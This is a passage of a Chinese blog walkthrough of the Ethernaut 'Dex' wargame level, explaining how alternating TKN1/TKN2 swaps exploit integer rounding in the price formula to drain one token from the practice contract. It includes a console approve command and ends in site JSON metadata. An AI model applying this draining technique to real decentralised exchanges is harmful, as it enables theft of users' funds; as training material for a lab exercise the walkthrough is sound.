TKN1/PLAYER - 20, TKN2/PLAYER - 110 Swap price: TKN2 -&gt; TKN1 - ’‘ Balances: TKN1/DEX - 90, TKN2/DEX - 0, TKN1/PLAYER - 20, TKN2/PLAYER - 110 6、我们先让TKN1和TKN2进行授权，意思是让合约能够操作110的TKN就可以了 7、我们先让TKN2先与TKN1进行交换，将TKN2/PLAYER - 10全部交换出去，注意对照swap()中的地址，TKN的DEX地址对应TKN的address(this),TKN的PLAYER地址对应的是TKN的msg.sender地址，判断条件是判断的from地址中msg.sender(player)的TKN的的值是否大于amount。 交换成功，四个值都对应的改变了，我们做好记录： 为满足下一个判断条件，我们需要将TKN1先与TKN2进行交换并记录下来（这里需要注意先后顺序，满足判断条件） 继续上述步骤，将TKN2先与TKN1进行交换并记录： 再继续，将TKN1先与TKN2进行交换并记录： 接着继续，将TKN2先与TKN1进行交换并记录： 再继续试试看，将TKN1先与TKN2进行交换并记录： 没错，这里就是题目所提到的错误，我们先拒绝掉这个请求，这里是因为合约没有足够的余额去请求的TKN。可以减少互换金额来处理此问题 7、现在轮到TKN1去跟TKN2交换了，于是我们要满足swap的判断条件，测试用最大的一个数值就行，可以分析判断，因为最开始我们是直接向合约请求的110的授权，所以这里45是刚好满足条件的，如果之前使用的是如下代码，授权的是100，也没关系，可以手动输入测试一下，很快就能够找到最大的一个值了，总之，因为我们使用的是除，类型使用的uint，多试几次绝对能够让一个TKN/DEX变成0， Token 1 approve await contract.approve(instance,Number((await contract.balanceOf('0xe1f647e443710dde0ed501cdb204b59351c13a37', instance)).toString())) 我们使用最快的办法 这时候发现TKN2/DEX变成0了，我们就成功了呀！ 8、快乐提交吧！这类Ethernaut闯关后面还会持续优化一些细节， 有需要的铁子们可以分享给需要的人，哦，对了，铁铁们记得点赞关注投币，一键三连呀！","categories":[{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"}],"author":"KW"}],"categories":[{"name":"未分类","slug":"未分类","permalink":"https://kdlwtrdrgm.github.io/categories/%E6%9C%AA%E5%88%86%E7%B1%BB/"},{"name":"Ethernaut","slug":"Ethernaut","permalink":"https://kdlwtrdrgm.github.io/categories/Ethernaut/"},{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"}],"tags":[{"name":"靶场","slug":"靶场","permalink":"https://kdlwtrdrgm.github.io/tags/%E9%9D%B6%E5%9C%BA/"},{"name":"区块链","slug":"区块链","permalink":"https://kdlwtrdrgm.github.io/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"}]}